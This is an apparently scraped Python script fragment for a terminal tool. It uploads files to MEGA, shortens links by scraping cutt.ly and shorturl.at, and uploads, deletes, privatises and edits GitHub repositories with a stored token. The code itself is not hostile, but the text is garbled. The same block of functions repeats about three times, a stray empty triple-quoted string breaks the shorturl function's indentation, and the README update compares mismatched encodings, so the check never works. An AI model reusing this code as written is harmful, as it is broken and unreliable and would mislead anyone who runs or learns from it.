    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
